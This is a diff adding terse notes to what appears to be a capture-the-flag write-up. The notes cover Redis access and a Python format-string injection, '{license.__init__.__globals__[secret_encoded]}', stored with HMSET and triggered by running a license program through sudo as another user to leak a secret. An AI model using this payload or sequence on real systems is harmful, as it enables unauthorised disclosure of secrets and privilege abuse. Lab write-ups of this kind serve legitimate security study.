@@ -335,3 +335,18 @@ if(args.check):
     print("")
 
 ```
+Analyze code;
+
+Understand how it fetches data in order to get a license key;
+
+connect to redis once more;
+
+redis-cli -s /run/redis/redis.sock;
+
+So after analyzing the code we have noticed that it needs first name, last name and username. Learn about Python string vulnerabilities and write it with redis and then read it as usr;
+
+HMSET evil first-name "{license.__init__.__globals__[secret_encoded]}" last-name evil username hecked;
+
+exit;
+
+run sudo /usr/bin/license -p evil (as USER cooper);
